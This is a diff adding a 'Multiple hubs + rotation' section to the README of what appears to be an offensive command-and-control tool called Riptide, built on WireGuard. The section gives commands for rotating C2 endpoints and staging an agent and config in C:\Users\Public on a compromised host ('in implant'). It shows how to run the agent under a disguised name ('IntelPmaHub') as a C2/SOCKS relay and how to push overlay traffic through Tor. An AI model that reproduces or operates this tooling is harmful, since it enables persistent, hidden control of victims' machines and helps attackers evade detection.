@@ -157,6 +157,37 @@ python3 mesh.py peer --out ./riptide-out --name windows --os windows --tag victi
 
 Packed into `peers/*.conf` as `[Riptide]` (userspace agent only; keep it off `wg-quick` hub conf).
 
+## Multiple hubs + rotation
+
+Primary hub keeps one WireGuard identity. Extra **addresses** rotate in the agent (`[Riptide] Hubs=`):
+
+```bash
+python3 mesh.py endpoint add --out ./riptide-out --addr 1.2.3.4:51820
+python3 mesh.py endpoint list --out ./riptide-out
+```
+
+Handshake stale (>90s) → next host:port on the same pubkey. Put DNS and raw IP in the list.
+
+**Hub on a host** (own key, `ListenPort`, BOF):
+
+```bash
+python3 mesh.py hub --out ./riptide-out --name harry-hub --os windows \
+  --listen 51820 --endpoints 192.168.0.135:51820
+python3 mesh.py pack --out ./riptide-out --name harry-hub
+# upload exe + peer.conf, then in implant:
+riptide-hub C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPmaHub
+```
+
+That host cryptokey-relays overlay peers and is a C2/SOCKS node. Inbound **UDP ListenPort** must reach it. If the VPS handshake dies, the agent promotes an extra hub (`Failover=`) to `10.66.0.0/24`.
+
+Tor last-hop: Tor daemon on that host (`127.0.0.1:9050`), then:
+
+```bash
+python3 mesh.py set --out ./riptide-out --name harry-hub --tor yes
+```
+
+Overlay SOCKS on that node dumps traffic into Tor. GUI shows a **tor** badge.
+
 Also on each peer:
 
 - local SOCKS `127.0.0.1:1080` + overlay SOCKS `:1080` (exit)
